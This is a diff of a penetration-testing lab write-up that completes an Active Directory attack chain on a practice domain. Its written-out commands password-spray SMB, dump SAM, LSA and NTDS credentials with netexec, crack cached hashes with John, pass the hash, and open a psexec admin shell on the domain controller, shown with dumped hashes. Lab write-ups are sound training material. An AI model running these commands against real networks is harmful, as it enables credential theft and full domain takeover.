@@ -8,20 +8,27 @@
 
 ## Executive Summary
 
+The victim network was running 3 machines, `DC01`, `Client1`, and `Client2`.
 
+We are given initial credentials for `lbennett` and pull BloodHound data.
 
+We get a credential while enumerating users on 10.0.2.4 (DC01) as `lbennett` . We password spray with SMB and now have a credential for `twest`.
+
+Now we are able to WinRM onto 10.0.2.7 (CLIENT-1). We use this to dump the local SAM/System registry data.
+
+We crack a hash for `Matt` user. We then dump the LSA subsystem hashes.
+
+We recover a hash for an account called `eknight`, and crack the hash.
+
+We realize `eknight` can auth over SMB to `CLIENT-2`, which is great.
+
+We dump the LSA hashes via `netexec` on 10.0.2.9 (CLIENT-2) and recover the password of `mthompson`, who is a Domain Admin. We have full access to the DC and can dump the NTDS, obtaining every user's password.
 ### Recommendations
 
-1. a
-2. b
-3. c
-
+1. No recommendations.
 ## Resources
 
-- resource1
-- github link
-- medium link
-- exploit-db link
+- https://hackerblueprint.com/labs
 
 ## Recon
 
@@ -541,12 +548,195 @@ Because we have admin, now we can dump hashes remotely using `netexec`.
 netexec smb ips -u twest -p 'HappyCactus$10' --sam
 ```
 
+(We already have these hashes, just a cool demo.)
 
+It's important to also run these other modes in `netexec`.
 
+```sh
+netexec smb ips -u twest -p 'HappyCactus$10' -M lsassy
+```
+
+Next is LSA, which is useful in pivoting. It dumps the "MS Cache".
+
+> In **NetExec (NXC)**, `--lsa` is a flag used during post-exploitation to dump sensitive credentials from the Windows Local Security Authority (LSA) subsystem. It targets the Windows **SECURITY** registry hive to extract secrets that Windows stores for domain authentication, cached records, and service account passwords. [[1](https://www.orangecyberdefense.com/no/blog/cybersecurity/dumping-lsa-secrets-a-story-about-task-decorrelation), [2](https://raxis.com/blog/cool-tools-netexec-nxc-fundamentals/), [3](https://www.hackingloops.com/netexec-cheat-sheet/), [4](https://www.orangecyberdefense.com/global/blog/cybersecurity/bypassing-edr-to-dump-lsa-secrets)]
+
+```sh
+netexec smb ips -u twest -p 'HappyCactus$10' --lsa
+```
+
+![](Pasted%20image%2020260712142829.png)
+
+We don't care about the local accounts, but `eknight` is incredibly useful to us.
+
+```txt
+SMB         10.0.2.7        445    CLIENT-1         HACK-ACADEMY.LOCAL/eknight:$DCC2$10240#eknight#e92981e7e9fc7e5732c32865e4c83a8a: (2025-11-29 10:54:13)  
+```
+
+```sh
+echo 'HACK-ACADEMY.LOCAL/eknight:$DCC2$10240#eknight#e92981e7e9fc7e5732c32865e4c83a8a:' > hashes_lsa_Client-1_10.0.2.7.txt
+```
+
+This is not an NT hash, so we can't relay or pass-the-hash.
+
+But we can crack it.
+
+```sh
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes_lsa_Client-1_10.0.2.7.txt
+```
+
+John should detect the hash type as `mscash2`.
+
+If you're not sure, you can also run:
+
+```sh
+sudo gem install haiti-hash
+
+haiti '$DCC2$10240#eknight#e92981e7e9fc7e5732c32865e4c83a8a'
+
+# Domain Cached Credentials 2 (DCC2), MS Cache 2 [HC: 2100] [JtR: mscash2]
+
+```
+
+So, John is done.
+
+```txt
+!!Stud87         (HACK-ACADEMY.LOCAL/eknight)    
+```
+
+Let's add this to our creds.
+
+```sh
+echo '!!Stud87' >> pass
+```
+
+Let's spray SMB creds (domain-joined) again.
+
+```sh
+netexec smb ips -u users -p pass --continue-on-success
+```
+
+We got a successful pwn on CLIENT-2!
+
+```txt
+SMB         10.0.2.9        445    CLIENT-2         [+] hack-academy.local\eknight:!!Stud87 (Pwn3d!)
+
+```
+
+This is useful because we just dumped CLIENT-1's SAM, not yet dumped CLIENT-2.
+
+- Targets: DC01, Client1, Client2
+- Target IP: 10.0.2.4, 10.0.2.7, 10.0.2.9
+
+```sh
+netexec smb 10.0.2.9 -u eknight -p '!!Stud87' --sam # got David
+```
+
+Now let's do LSA.
+
+```sh
+netexec smb 10.0.2.9 -u eknight -p '!!Stud87' --lsa
+```
+
+We found a new user's password hash, `mthompson`...
+
+```txt
+SMB         10.0.2.9        445    CLIENT-2         HACK-ACADEMY.LOCAL/mthompson:$DCC2$10240#mthompson#364a73de9ce144051ec14a2fdeb6a757: (2025-11-29 22:53:13)                                                                            
+```
 
 ## Root access
 
-tbd
+If we go back to BloodHound, we can see that `mthompson` is actually a Domain Admin :)
+
+![](Pasted%20image%2020260712162659.png)
+
+```sh
+echo 'HACK-ACADEMY.LOCAL/mthompson:$DCC2$10240#mthompson#364a73de9ce144051ec14a2fdeb6a757:' > hashes_lsa_Client-2_10.0.2.9.txt
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes_lsa_Client-2_10.0.2.9.txt
+```
+
+Done.
+
+```txt
+Password123!!    (HACK-ACADEMY.LOCAL/mthompson)
+```
+
+Update our password list for spraying:
+
+```sh
+echo 'Password123!!' >> pass
+```
+
+So...I'm thinking that since `mthompson` is a Domain Admin...we're done. We've pwned the box? (Let's keep watching :D )
+
+Spray for fun:
+
+```sh
+netexec smb ips -u mthompson -p 'Password123!!' --lsa
+```
+
+We can also dump the NTDS.
+
+> NTDS stands for **NT Directory Services**. In Active Directory (AD), it usually refers to **NTDS.DIT**, the central database file stored on every Domain Controller that holds all directory data, including user accounts, computer objects, group memberships, and critical password hashes. [[1](https://medium.com/@harikrishnanp006/understanding-ntds-dit-the-core-of-active-directory-faac54cc628a), [2](https://trustedsec.com/blog/exploring-ntds-dit-part-1-cracking-the-surface-with-dit-explorer), [3](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds), [4](https://www.netsecurity.com/how-threat-actors-exfiltrate-ntds-dit-from-windows-machines-and-how-threatresponder-helps-stop-them/)]
+
+```sh
+netexec smb 10.0.2.4 -u mthompson -p 'Password123!!' --ntds
+
+<<YAY
+
+┌──(kali㉿kali)-[~]
+└─$ netexec smb 10.0.2.4 -u mthompson -p 'Password123!!' --ntds
+SMB         10.0.2.4        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                          
+SMB         10.0.2.4        445    DC01             [+] hack-academy.local\mthompson:Password123!! (Pwn3d!)
+SMB         10.0.2.4        445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.0.2.4        445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:c0ced2de918b4a7c1b9f4efd225dd503:::                  
+SMB         10.0.2.4        445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                          
+SMB         10.0.2.4        445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b3814b17f76015a3112d545f4899eabd:::                         
+SMB         10.0.2.4        445    DC01             hack-academy.local\mjohnson:1125:aad3b435b51404eeaad3b435b51404ee:ac2ccc026dea7c08845a58245f9d1a20:::   
+SMB         10.0.2.4        445    DC01             hack-academy.local\lbennett:1126:aad3b435b51404eeaad3b435b51404ee:08b1de7a0f8e635ffd4416b2aac575bb:::   
+SMB         10.0.2.4        445    DC01             hack-academy.local\egreen:1127:aad3b435b51404eeaad3b435b51404ee:6cef82c3f7326a708020d3488777e8b8:::     
+SMB         10.0.2.4        445    DC01             hack-academy.local\spatel:1128:aad3b435b51404eeaad3b435b51404ee:40dca294807d71c40cf79ca8f80630e4:::     
+SMB         10.0.2.4        445    DC01             hack-academy.local\dreyes:1129:aad3b435b51404eeaad3b435b51404ee:d66d916172d22964ca1dcbc262009ecd:::     
+SMB         10.0.2.4        445    DC01             hack-academy.local\nflores:1130:aad3b435b51404eeaad3b435b51404ee:851923db851118b1cf6e3b43486b6f3b:::    
+SMB         10.0.2.4        445    DC01             hack-academy.local\clee:1131:aad3b435b51404eeaad3b435b51404ee:695e750f127db5a5e5c9286dc3f780e4:::       
+SMB         10.0.2.4        445    DC01             hack-academy.local\otran:1132:aad3b435b51404eeaad3b435b51404ee:ebc5b3ec914252428ded45305314b59a:::      
+SMB         10.0.2.4        445    DC01             hack-academy.local\zmiller:1133:aad3b435b51404eeaad3b435b51404ee:b6b667f08033fd13ad9dd14bfe84bceb:::    
+
+YAY
+```
+
+And that's the password hashes for all users, I think.
+
+Now we can do this:
+
+```sh
+netexec smb 10.0.2.4 -u administrator -H 'c0ced2de918b4a7c1b9f4efd225dd503'
+# SMB         10.0.2.4        445    DC01             [+] hack-academy.local\administrator:c0ced2de918b4a7c1b9f4efd225dd503 (Pwn3d!)
+
+
+```
+
+And:
+
+```sh
+netexec smb 10.0.2.4 -u administrator -H 'c0ced2de918b4a7c1b9f4efd225dd503' -X whoami
+```
+
+![](Pasted%20image%2020260712184556.png)
+
+We can run code on the DC as admin.
+
+If we want an admin shell on DC:
+
+```sh
+impacket-psexec hack-academy.local/administrator@10.0.2.4 -hashes :c0ced2de918b4a7c1b9f4efd225dd503 
+```
+
+![](Pasted%20image%2020260712184736.png)
+
+We have pwned the DC.
+
+![](Pasted%20image%2020260712184817.png)
 
 ## Proof
 
@@ -561,9 +751,6 @@ tbd
 
 ### Root proof
 
-- `ip a`/`ifconfig`
-- `whoami`
-- `hostname`
-- `date`
-- `cat proof.txt`
-(IMG_PLACEHOLDER)
+![](Pasted%20image%2020260712184736.png)
+
+![](Pasted%20image%2020260712184817.png)
